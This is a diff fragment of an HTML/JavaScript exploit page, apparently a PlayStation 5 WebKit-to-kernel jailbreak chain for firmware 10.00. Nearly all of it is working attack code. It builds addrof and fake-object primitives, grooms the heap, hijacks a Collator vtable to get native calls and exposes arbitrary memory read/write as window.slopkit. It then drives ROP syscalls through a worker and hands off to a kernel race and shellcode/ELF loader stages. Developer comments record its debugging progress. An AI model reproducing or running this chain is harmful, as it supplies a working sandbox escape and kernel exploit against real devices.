+        && arenaViewHeaderOK && arenaBackingRepeated
+        && collatorHeaderOK && compareFnHeaderOK
+        && getpidStatus === 1
+        && notifyAddressOK
+        && notificationRequestOK
+        && notifyEntryAddress === kernelBase + NOTIFY_OFFSET
+        && compositionLength === EXPECTED_LENGTH;
+    try {
+        sessionStorage.setItem(blockKey, "1");
+        sessionStorage.setItem(passKey, "pending");
+        commitBlockConfirmed = sessionStorage.getItem(blockKey) === "1"
+            && sessionStorage.getItem(passKey) === "pending";
+    } catch {
+        commitBlockConfirmed = false;
+    }
+
+    if (leakPass) {
+        mark("MODULE-IMPORT-LEAK-PASS",
+            "windows-read-twice=true-provider-crosschecks=true"
+            + "-holder-targets-validated=true-notification-target-verified=true");
+    } else {
+        mark("MODULE-IMPORT-LEAK-MISMATCH", `rw=${rwHeaderOK}`
+            + `-function=${functionHeaderOK}`
+            + `-native=${nativeExecutableHeaderOK}`
+            + `-base=${webkitBaseOK}`
+            + `-repeat=${pointersRepeated}-got=${gotReadOK}`
+            + `-requirements=${requirementsBaseOK}`
+            + `-libc=${libcBaseOK}-kernel=${kernelBaseOK}`
+            + `-restore=${restoreObserved}`);
+    }
+
+    mark("ROOTS-LIVE", `rw-mirror=${rwMirror[0].toString(16)}`
+        + `-guard-byte=${targetView[0].toString(16)}`
+        + `-parseInt-type=${typeof nativeTarget}`
+        + `-length-word=${lengthWord.keep.toString(16)}`);
+    if (leakPass && notifyReady && carrierArmedForCommit
+        && commitBlockConfirmed) {
+        mark("NOTIFY-PLAN-PASS", `arena-filled=${arenaFilledOK}`
+            + "-carrier-parked-at-collator-field=true");
+        mark("NONFATAL-NATIVE-CALL-NEXT",
+            "system-notification-via-natural-stack-no-kernel-exploit");
+        setTimeout(commitNotificationProof, 250);
+        return;
+    }
+
+    mark("NOTIFY-PLAN-MISMATCH", `ready=${notifyReady}`
+        + `-arena=${arenaLayoutOK}-filled=${arenaFilledOK}`
+        + `-collator=${collatorHeaderOK}`
+        + `-compare=${compareFnHeaderOK}`
+        + `-request=${notificationRequestOK}`
+        + `-target=${notifyAddressOK}`
+        + `-carrier-armed=${carrierArmedForCommit}`
+        + `-repeat-block=${commitBlockConfirmed}`);
+    failed();
+    setTimeout(() => { mark("SURVIVED-NO-COMMIT-T1000"); }, 1000);
+}
+
+function commitNotificationProof() {
+    if (!notifyReady || !carrierArmedForCommit || !commitBlockConfirmed
+        || commitStarted) {
+        mark("COMMIT-ABORT", "state-changed-before-commit");
+        failed();
+        return;
+    }
+
+    for (let before = 0; before < collatorOriginal.length; ++before) {
+        if (rwView[before] !== collatorOriginal[before]) {
+            mark("COMMIT-ABORT", "collator-bytes-changed-before-commit");
+            failed();
+            return;
+        }
+    }
+    if (rwView[0x1b] !== 0) {
+        mark("COMMIT-ABORT", "ascii-tristate-no-longer-false");
+        failed();
+        return;
+    }
+    if (!notificationRequestOK
+        || notificationRequest.length !== NOTIFICATION_REQUEST_SIZE) {
+        mark("COMMIT-ABORT", "notification-request-changed-before-commit");
+        failed();
+        return;
+    }
+
+    commitStarted = true;
+    const fakeHigh = Math.floor(fakeUCollatorAddress / 0x100000000);
+    scratchWords[0] = fakeUCollatorAddress - fakeHigh * 0x100000000;
+    scratchWords[1] = fakeHigh;
+    let notifyResult = 0;
+    let callError = null;
+    for (let commitByte = 0; commitByte < 8; ++commitByte)
+        rwView[commitByte] = scratchBytes[commitByte];
+
+    try {
+        notifyResult = compareFn(notificationRequest, "b");
+    } catch (error) {
+        callError = error;
+    }
+
+    for (let restoreByte = 0; restoreByte < collatorOriginal.length;
+        ++restoreByte)
+        rwView[restoreByte] = collatorOriginal[restoreByte];
+    let collatorRestored = true;
+    for (let verifyRestore = 0; verifyRestore < collatorOriginal.length;
+        ++verifyRestore) {
+        if (rwView[verifyRestore] !== collatorOriginal[verifyRestore])
+            collatorRestored = false;
+    }
+
+    // NOTE (slopkit-lapse port): the original notify.html tears down rwView
+    // here. We keep it alive so lapse-runtime can use aimCarrier + rwView as
+    // the R/W primitive.
+    //
+    //   fakeHost.q2 = null;
+    //   rwView = null;
+    //   rwMirror = null;
+    //   rwBuffer = null;
+
+    const notifyReturned = !callError && collatorRestored
+        && Number.isFinite(notifyResult)
+        && Math.floor(notifyResult) === notifyResult;
+    const notificationSent = notifyReturned && notifyResult === 0;
+    let passPersisted = false;
+    if (notificationSent) {
+        try {
+            sessionStorage.setItem(passKey, "1");
+            passPersisted = sessionStorage.getItem(passKey) === "1";
+        } catch {}
+    }
+
+    if (notificationSent && passPersisted) {
+        mark("NOTIFY-NATIVE-CALL-PASS", "result=0"
+            + "-collator-restored=true-permanent-block=true");
+        succeeded(`result=0 attempt=${attemptNumber}`);
+        handoffToLapse();
+    } else if (callError) {
+        mark("NOTIFY-CALL-THREW", `${callError?.name}`
+            + `:${String(callError?.message).slice(0, 80)}`
+            + `-collator-restored=${collatorRestored}`);
+        failed();
+    } else if (notificationSent) {
+        mark("NOTIFY-PASS-STORAGE-FAIL", "result=0"
+            + "-collator-restored=true");
+        succeeded(`result=0 attempt=${attemptNumber}`);
+        handoffToLapse();
+    } else if (notifyReturned) {
+        const notifyResultU32 = notifyResult < 0
+            ? notifyResult + 0x100000000 : notifyResult;
+        mark("NOTIFY-NATIVE-CALL-RETURN", `error=${hex(notifyResultU32)}`
+            + `-signed=${notifyResult}`
+            + "-collator-restored=true");
+        failed();
+    } else {
+        mark("NOTIFY-RETURN-MISMATCH", `result=${notifyResult}`
+            + `-collator-restored=${collatorRestored}`);
+        failed();
+    }
+    setTimeout(() => { mark("SURVIVED-NOTIFY-T1000"); }, 1000);
+}
+
+function runGroomAndLoad() {
+    try {
+        mark("SSV-GROOM-ENTER", `n=${DRAIN_COUNT}`);
+        const channel = new MessageChannel();
+        channel.port1.close();
+        channel.port2.close();
+
+        for (let i = 0; i < DRAIN_COUNT; ++i)
+            keepAlive[keepIndex++] = buffer(DRAIN_SIZE);
+
+        let slab = buffer(SLAB_SIZE);
+        channel.port1.postMessage(0, [slab]);
+        slab = null;
+
+        const butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
+        const butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
+        const separator = buffer(SEPARATOR_SIZE);
+        const earlyHole = buffer(EARLY_HOLE_SIZE);
+        const guard = buffer(GUARD_SIZE);
+        const predecessor = buffer(PREDECESSOR_SIZE);
+        const finalHole = buffer(FINAL_HOLE_SIZE);
+
+        fillRawCellPointers(predecessor, fakeAddress);
+        keepAlive[keepIndex++] = separator;
+        keepAlive[keepIndex++] = guard;
+        keepAlive[keepIndex++] = predecessor;
+        mark("PREDECESSOR-FILLED", `qwords=${PREDECESSOR_SIZE / 8}`
+            + `-fake=${hex(fakeAddress)}`);
+
+        channel.port1.postMessage(0, [butterflyHole1, butterflyHole2,
+            earlyHole, finalHole]);
+        loadHistoryCritical();
+    } catch (error) {
+        try { clearPredecessor(); } catch {}
+        retrySafe = true;
+        compositionError = error;
+        compositionState = -1;
+    }
+    reportComposition();
+}
+
+function beginComposition() {
+    if (captureState === 0) {
+        finishEarlySafeAttempt("ADDROF-NO-RESULT",
+            "capture-task-did-not-finish", "addrof-no-result");
+        return;
+    }
+    if (captureState < 0) {
+        finishEarlySafeAttempt("ADDROF-THREW",
+            `${captureError?.name}:`
+            + String(captureError?.message).slice(0, 80),
+            "addrof-threw");
+        return;
+    }
+
+    const a0 = pointerFromWords(capturedWords, 0);
+    const b0 = pointerFromWords(capturedWords, 4);
+    const a1 = pointerFromWords(capturedWords, 8);
+    const b1 = pointerFromWords(capturedWords, 12);
+    const repeated = a0 === a1 && b0 === b1;
+    const distinct = a0 !== b0;
+    const plausible = plausibleCell(a0) && plausibleCell(b0)
+        && plausibleCell(a1) && plausibleCell(b1);
+    const fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
+    const sourceCovered = fakeChars * 2 <= CARRIER_BYTES;
+
+    mark("ADDROF-RETURNED", REVISION);
+    mark("ADDROF-COPY", `chars=${copiedLength}-source-covered=${sourceCovered}`);
+    mark("ADDROF-POINTERS", `HOST=${hex(a0)}-TARGET=${hex(b0)}`
+        + `-HOST2=${hex(a1)}-TARGET2=${hex(b1)}`);
+
+    if (!(repeated && distinct && plausible && sourceCovered)) {
+        finishEarlySafeAttempt("ADDROF-FAIL",
+            `repeat=${repeated}-distinct=${distinct}`
+            + `-plausible=${plausible}-covered=${sourceCovered}`,
+            "addrof-validation");
+        return;
+    }
+
+    hostAddress = a0;
+    targetAddress = b0;
+    targetAddressHigh = Math.floor(targetAddress / 0x100000000);
+    targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
+    if (targetAddressHigh < 0 || targetAddressHigh > 0xffff
+        || targetAddressLow < 0 || targetAddressLow > 0xffffffff
+        || Math.floor(targetAddressLow) !== targetAddressLow
+        || targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
+        finishEarlySafeAttempt("TARGET-ADDRESS-FAIL",
+            `target=${hex(targetAddress)}`, "target-address");
+        return;
+    }
+    fakeAddress = hostAddress + 0x10;
+    if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
+        finishEarlySafeAttempt("FAKE-ADDRESS-FAIL",
+            `host=${hex(hostAddress)}`, "fake-address");
+        return;
+    }
+    mark("FAKE-ADDRESS", `host=${hex(hostAddress)}-fake=${hex(fakeAddress)}`
+        + "-delta=0x10");
+    runGroomAndLoad();
+}
+
+catState("run");
+
+mark("BOOT", `rev=${REVISION}-k=${K}-n=${DRAIN_COUNT}`
+    + `-attempt=${attemptNumber}-armed=${armed}-loop=relentless`);
+
+if (!armed) {
+    stopped = true;
+    catState("run");
+    showStatus("open with ?go=1", "run");
+} else if (typeof BigInt !== "function" || typeof MessageChannel !== "function"
+    || typeof Symbol !== "function" || typeof history === "undefined"
+    || typeof history.replaceState !== "function") {
+    mark("UNSUPPORTED");
+    showStatus("unsupported browser", "bad");
+} else {
+    // No pass/block latch: every armed load runs fresh so it can be re-run.
+    alreadyPassed = false;
+    alreadyBlocked = false;
+    try {
+        sessionStorage.removeItem(passKey);
+        sessionStorage.removeItem(blockKey);
+    } catch {}
+    startAttempt();
+}
+
+////////////////////////////////////////////////////////////////////////////
+// slopkit -> lapse handoff
+//
+// At this point the WebKit sandbox is popped and the collator vtable trick
+// has been demonstrated by firing a system notification. We now keep the
+// R/W primitive alive, expose it as window.slopkit, then load lapse-runtime
+// + lapse.js + elfldr.js in sequence.
+////////////////////////////////////////////////////////////////////////////
+
+let lapseHandoffDone = false;
+
+function reissueNotification(msg) {
+    // Reuse the collator vtable one-shot for a new message. Rewrites the
+    // notification request buffer to `msg` (ASCII, padded to size), re-arms
+    // the arena, and re-invokes compareFn. Requires rwView etc. still alive.
+    if (!rwView) return -1;
+    try {
+        const trailing = NOTIFICATION_REQUEST_SIZE
+            - NOTIFICATION_MESSAGE_OFFSET - msg.length;
+        if (trailing < 1) return -2;
+        const req = "\x00".repeat(NOTIFICATION_MESSAGE_OFFSET)
+            + String(msg) + "\x00".repeat(trailing);
+
+        // Rearm the fake UCollator arena and the compare function slot.
+        const fakeHigh = Math.floor(fakeUCollatorAddress / 0x100000000);
+        scratchWords[0] = fakeUCollatorAddress - fakeHigh * 0x100000000;
+        scratchWords[1] = fakeHigh;
+        for (let i = 0; i < 8; ++i) rwView[i] = scratchBytes[i];
+
+        const r = compareFn(req, "b");
+
+        // Restore the collator bytes so JS still holds a valid Collator.
+        for (let i = 0; i < collatorOriginal.length; ++i)
+            rwView[i] = collatorOriginal[i];
+
+        return r;
+    } catch (e) {
+        return -3;
+    }
+}
+
+async function handoffToLapse() {
+    if (lapseHandoffDone) return;
+    lapseHandoffDone = true;
+    mark("POOPS-HANDOFF-BEGIN", `fw=${FW_LABEL}`);
+
+    // 1. Load the per-fw lapse offset table.
+    let lapseOffsets = null;
+    try {
+        const r = await fetch("offsets/lapse-offsets.json",
+            { cache: "no-store" });
+        if (r.ok) {
+            const all = await r.json();
+            lapseOffsets = all[FW_LABEL] || null;
+        }
+    } catch (e) {
+        mark("POOPS-OFFSETS-LOAD-FAIL", String(e && e.message).slice(0, 80));
+    }
+    if (!lapseOffsets) {
+        mark("POOPS-OFFSETS-MISSING", `fw=${FW_LABEL}`);
+    }
+
+    // 2. Expose primitives as window.slopkit.
+    //
+    // realCollatorAddress + collatorOriginal are needed by lapse-runtime.js
+    // to re-arm the collator's m_ucollator pointer before each ROP-chain
+    // dispatch. The notify path tore down that pointer at the end; every
+    // subsequent compareFn() call has to re-wire it to fakeUCollatorAddress
+    // and restore it after, exactly like reissueNotification() does.
+    window.slopkit = {
+        candidate: null,   // patched below
+        rwView: rwView,
+        aimCarrier: aimCarrier,
+        restoreCarrier: restoreCarrier,
+        arenaView: arenaView,
+        arenaBacking: arenaBacking,
+        fakeUCollatorAddress: fakeUCollatorAddress,
+        fakeVtableAddress: fakeVtableAddress,
+        compareFn: compareFn,
+        realCollator: realCollator,
+        realCollatorAddress: realCollatorAddress,
+        collatorOriginal: collatorOriginal,   // Uint8Array snapshot
+        // targetHolder + its cell address + a few known-address inline
+        // properties are what lapse-runtime uses to bootstrap addrof:
+        //   scan targetHolder's memory for a JSValue matching one of the
+        //   known addresses (parseInt / arenaView / realCollator) to
+        //   discover the byte offset of each property slot; then read
+        //   arbitrary object addresses by writing the target into a slot
+        //   and reading that slot back.
+        targetHolder: targetHolder,
+        targetAddress: targetAddress,
+        nativeTargetAddress: nativeTargetAddress,
+        arenaViewAddress: arenaViewAddress,
+        hostAddress: hostAddress,
+        fakeHost: fakeHost,
+        kernelBase: kernelBase,
+        webkitBase: webkitBase,
+        naturalTrampolineAddress: naturalTrampolineAddress,
+        notifyEntryAddress: notifyEntryAddress,
+        FW_VERSION: FW_LABEL,
+        lapseOffsets: lapseOffsets,
+        screenLine: screenLine,
+        mark: mark,
+        sendNotification: reissueNotification,
+
+        // Low-level "arm collator, fire compareFn(arg1, arg2), restore".
+        // Runtime uses this so we don't duplicate the re-arm logic and can
+        // guarantee the JS Collator object is left in a valid state.
+        armAndFire: function (arg1, arg2) {
+            if (!rwView) throw new Error("armAndFire: rwView torn down");
+            // aim at realCollator + 0x18 (m_ucollator ptr slot)
+            aimCarrier(lapseCandidate, realCollatorAddress + 0x18);
+            const fakeHigh = Math.floor(fakeUCollatorAddress / 0x100000000);
+            scratchWords[0] = fakeUCollatorAddress - fakeHigh * 0x100000000;
+            scratchWords[1] = fakeHigh;
+            for (let i = 0; i < 8; ++i) rwView[i] = scratchBytes[i];
+            let r, err = null;
+            try { r = compareFn(arg1, arg2); }
+            catch (e) { err = e; }
+            // restore collator bytes
+            for (let i = 0; i < collatorOriginal.length; ++i)
+                rwView[i] = collatorOriginal[i];
+            if (err) throw err;
+            return r;
+        },
+    };
+
+    window.slopkit.candidate = lapseCandidate;
+    if (!lapseCandidate) {
+        mark("POOPS-CANDIDATE-MISSING",
+            "notifyReady-path-did-not-save-cell");
+    } else {
+        mark("POOPS-CANDIDATE-OK", `cell=${hex(targetAddress)}`);
+    }
+
+    // 3. Load runtime + lapse.js + elfldr.js.
+    function loadScript(src) {
+        return new Promise((resolve, reject) => {
+            const s = document.createElement("script");
+            s.src = src;
+            s.onload = () => resolve();
+            s.onerror = () => reject(new Error("load fail: " + src));
+            document.body.appendChild(s);
+        });
+    }
+
+    // Beacon helper: findings go back as /REPORT/ URLs, which the host prints
+    // in its own log. Reading results off a TV is not practical.
+    function report(tag, obj) {
+        var q = [];
+        for (var k in obj)
+            q.push(encodeURIComponent(k) + "=" + encodeURIComponent(String(obj[k])));
+        try {
+            fetch("/REPORT/" + tag + "?" + q.join("&"), {cache: "no-store"})
+                .catch(function () {});
+        } catch (e) {}
+    }
+
+    // --- port first -----------------------------------------------------
+    // It binds lazily, so the runtime need not exist yet. This also means its
+    // report survives whatever keeps killing the renderer in the stage below.
+    try {
+        await loadScript("netctrl-ps5.js");
+        const defined = (typeof window.netctrl_ps5 !== "undefined");
+        mark("NETCTRL-JS-LOADED", "defined=" + defined);
+        report("netctrl_early", {
+            defined: defined ? 1 : 0,
+            version: defined ? window.netctrl_ps5.version : "none",
+            syscalls: defined ? Object.keys(window.netctrl_ps5.SYSCALL_NUMS).length : 0,
+            fw: (window.slopkit && window.slopkit.FW_VERSION) || "?",
+            wk: (window.slopkit && window.slopkit.webkitBase)
+                ? "0x" + BigInt(window.slopkit.webkitBase).toString(16) : "none",
+            lk: (window.slopkit && window.slopkit.kernelBase)
+                ? "0x" + BigInt(window.slopkit.kernelBase).toString(16) : "none"
+        });
+    } catch (e) {
+        mark("NETCTRL-JS-LOAD-FAIL", String(e && e.message).slice(0, 60));
+        report("netctrl_early", {error: String(e && e.message).slice(0, 120)});
+    }
+
+    try {
+        await loadScript("lapse-runtime.js");
+        mark("POOPS-RUNTIME-LOADED");
+        report("runtime", {loaded: 1});
+    } catch (e) {
+        mark("POOPS-RUNTIME-LOAD-FAIL", String(e && e.message).slice(0, 80));
+        report("runtime", {error: String(e && e.message).slice(0, 120)});
+        return;
+    }
+
+    // Upstream's lapseRuntimeSelfTest() is skipped. It drives the runtime's
+    // ROP executor, which the netcontrol port does not use - it builds its own
+    // thr_new chain from gadgets verified against this firmware.
+    mark("POOPS-SELFTEST-SKIPPED", "port-is-self-contained");
+
+    /* rop-worker must load BEFORE runtimeStatus(): netctrl-ps5 now issues
+       every syscall through rop_worker.syscallSync, so syscallGaps() counts a
+       missing runner as a gap. Loading it afterwards made status report
+       ready=false / missing=none and bail before the run block. */
+    try {
+        mark("ROPW-LOAD");
+        await loadScript("rop-worker.js");
+    } catch (e) {
+        mark("ROPW-LOAD-FAILED", String(e && e.message).slice(0, 80));
+    }
+
+    // --- kernel stage: sys_netcontrol instead of Y2JB's aio lapse.js ----
+    try {
+        const st = window.netctrl_ps5.runtimeStatus();
+        mark("NETCTRL-STATUS", "ready=" + st.ready);
+        report("netctrl_status", {
+            ready: st.ready ? 1 : 0,
+            missing: st.missing.join("+") || "none",
+            syscalls: st.syscalls_known,
+            gadgets: st.gadgets,
+            fw: st.fw,
+            wk: st.webkit_base,
+            lk: st.kernel_base,
+            needs_libc: st.needs_libc ? 1 : 0
+        });
+        if (!st.ready) {
+            mark("NETCTRL-RUNTIME-INCOMPLETE");
+            return;
+        }
+    } catch (e) {
+        report("netctrl_status", {error: String(e && e.message).slice(0, 120)});
+        return;
+    }
+
+    /* DISARMED 2026-08-07. netctrl_ps5.run() is NOT the thing to test right
+       now: it dies at its first syscall because lapse-runtime's runChain is
+       fatal on 10.00 (getpid, 0 args, kills the renderer - the kernel is
+       innocent, Xfast_syscall never dereferences the user RSP). Firing it
+       again would only reproduce a failure we have already localised.
+       The jailbreak offsets it writes remain RE-verified; see
+       reference_netctrl_jailbreak_offsets.md. Re-arm once a working chain
+       runner exists. */
+    window.NETCTRL_AUTORUN = 0;
+
+    /* SURVEY: worker-thread chain runner, discovery only.
+       Reads the pthread list, finds the Worker's stack, and scans it for saved
+       return addresses. Writes nothing, hijacks nothing - we have no ground
+       truth for the return-address slot on 10.00 (umtx2's is a measured
+       constant from fw <= 5.50), so this run exists to produce that data. */
+    try {
+        const sk = window.slopkit || {};
+        /* Scratch must NOT come from window.malloc: 0x500 exceeds
+           lapse-runtime's 248-byte arena, so malloc takes its slab path, which
+           issues an mmap syscall through the very runChain that kills the
+           renderer. That one line is what killed the previous survey before it
+           reached a single line of its own code.
+           Use the arena directly instead - no syscall. Offsets 0x500..0xf00
+           were lapse-runtime's ROP_CHAIN region, which is dead space now that
+           we no longer use runChain; FAKE_UCOLLATOR (0x100) and the fake
+           vtable (0x300) are left untouched because read64/write64 still ride
+           the carrier. */
+        const scratch = BigInt(sk.arenaBacking) + 0x500n;
+        /* Gadgets come from netctrl-ps5's table, which was disassembled at
+           every RVA in the devkit's own modules. rop-worker supplies the
+           libkernel ones (setjmp/longjmp/pop_rsp/syscall_wrapper) itself. */
+        const G = window.netctrl_ps5 && window.netctrl_ps5.gadgetsFor
+            ? window.netctrl_ps5.gadgetsFor(String(sk.FW_VERSION || ""))
+            : null;
+        window.rop_worker.init({
+            kernelBase: sk.kernelBase,
+            webkitBase: sk.webkitBase,
+            gadgets: G || {},
+            scratch: scratch,
+        });
+        mark("ROPW-INIT", "k=" + hex(sk.kernelBase) + " g=" + (G ? "ok" : "MISSING"));
+        await window.rop_worker.survey();
+        mark("ROPW-SURVEY-DONE");
+
+        /* getpid(): 0 args, side-effect free, number RE-verified. One call
+           exercises the entire path - Worker, thread walk, slot hijack, chain,
+           syscall, longjmp resume. A plausible pid means the primitive works;
+           anything else stops here rather than proceeding to the race. */
+        if (G) {
+            const r = await window.rop_worker.testGetpid();
+            mark("ROPW-GETPID", String(r.retval));
+            report("ropw_getpid", {pid: String(r.retval), ms: r.ms});
+
+            /* Same call through the SYNCHRONOUS path (busy-poll, no await).
+               If this returns the same pid, netctrl-ps5.js keeps its
+               synchronous API and its race timing - no async refactor. */
+            try {
+                const s = window.rop_worker.testGetpidSync();
+                mark("ROPW-GETPID-SYNC", String(s.retval) + "-spins=" + s.spins);
+                report("ropw_getpid_sync",
+                       {pid: String(s.retval), spins: s.spins,
+                        match: String(s.retval === r.retval)});
+                /* ARMED. The race only runs once BOTH getpid proofs pass, so a
+                   broken primitive stops us before the kernel is touched.
+                   netctrl-ps5 now issues every syscall through
+                   rop_worker.syscallSync and allocates via get_backing_store -
+                   window.syscall / window.call / window.malloc all route to
+                   lapse-runtime's runChain, which is fatal on 10.00. */
+                if (s.retval === r.retval) {
+                    mark("NETCTRL-ARMED", "primitive verified both ways");
+                    try {
+                        const ok = window.netctrl_ps5.run();
+                        mark("NETCTRL-RUN", String(ok));
+                        report("netctrl_run", {result: String(ok)});
+                        // fire AFTER the +1000ms SURVIVED marker so it is the last
+                        // line in the log on any failure that did not throw.
+                        if (!ok) setTimeout(function () { mark("REBOOT AND TRY AGAIN"); }, 2000);
+                    } catch (e2) {
+                        mark("NETCTRL-THREW", String(e2 && e2.message).slice(0, 90));
+                        report("netctrl_run", {error: String(e2 && e2.message).slice(0, 140)});
+                        setTimeout(function () { mark("REBOOT AND TRY AGAIN"); }, 2000);
+                    }
+                } else {
+                    mark("NETCTRL-NOT-ARMED", "sync/async pid mismatch");
+                    setTimeout(function () { mark("REBOOT AND TRY AGAIN"); }, 2000);
+                }
+            } catch (e) {
+                mark("ROPW-SYNC-FAILED", String(e && e.message).slice(0, 80));
+                report("ropw_getpid_sync", {error: String(e && e.message).slice(0, 120)});
+            }
+        } else {
+            mark("ROPW-NO-GADGETS", "netctrl_ps5.gadgetsFor missing");
+        }
+        report("ropw_survey", {done: 1});
+    } catch (e) {
+        mark("ROPW-THREW", String(e && e.message).slice(0, 90));
+        report("ropw_survey", {error: String(e && e.message).slice(0, 120)});
+    }
+    return;
+
+    /* Beacon every netctrl stage line, not just the screen. The armed run is
+       currently dying inside run() with no NETCTRL-RUN and no NETCTRL-THREW,
+       i.e. hard enough that the catch below never executes - so the only way
+       to see which stage it reached is a synchronous beacon per stage.
+       Costs timing fidelity; set to 0 once the failing stage is known. */
+    /* TRACE OFF for the armed race. Every stage line is a SYNCHRONOUS XHR,
+       which is real interference for a timing-sensitive triple-free - the
+       window find_twins is hunting is exactly what a blocking HTTP round trip
+       between stages destroys. The phase markers in netctrl.html still report
+       (NETCTRL-ARMED / RUN / THREW), so a failure is still localised to a
+       phase; only the per-stage NC lines go quiet. Set back to 1 to debug. */
+    window.NETCTRL_TRACE = 1;        /* setup phases: beacons ON  */
+    window.NETCTRL_TRACE_RACE = 0;   /* race phases:  beacons OFF (timing) */
+
+    if (!window.NETCTRL_AUTORUN) {
+        mark("NETCTRL-READY", "set NETCTRL_AUTORUN=1 to fire");
+        report("netctrl_ready", {armed: 0});
+        return;
+    }
+
+    try {
+        const ok = window.netctrl_ps5.run();
+        mark("NETCTRL-RUN", String(ok));
+        report("netctrl_run", {result: String(ok)});
+    } catch (e) {
+        mark("NETCTRL-THREW", String(e && e.message).slice(0, 80));
+        report("netctrl_run", {error: String(e && e.message).slice(0, 120)});
+    }
+    return;
+
+    // 4. lapse.js is a self-invoking async IIFE — it starts on load.
+    //    Stage 5 (ps5_jailbreak) calls load_aioshellcode(), which fetches
+    //    kexp_2026_05_25.bin + elfldr-ps5-1360.elf and spawns the
+    //    kernel-shellcode thread that installs the ELF loader. There's no
+    //    separate elfldr.js call — the aioshellcode handles that end.
+    //    We just wait for the JB to complete or time out.
+    const startedAt = Date.now();
+    const timeoutMs = 5 * 60 * 1000;
+    while (true) {
+        try {
+            if (typeof window.is_jailbroken === "function"
+                && window.is_jailbroken()) {
+                mark("POOPS-JAILBROKEN");
+                break;
+            }
+        } catch (e) {}
+        if (Date.now() - startedAt > timeoutMs) {
+            mark("POOPS-TIMEOUT");
+            return;
+        }
+        await new Promise(r => setTimeout(r, 500));
+    }
+}
+</script>
+</body>
+</html>
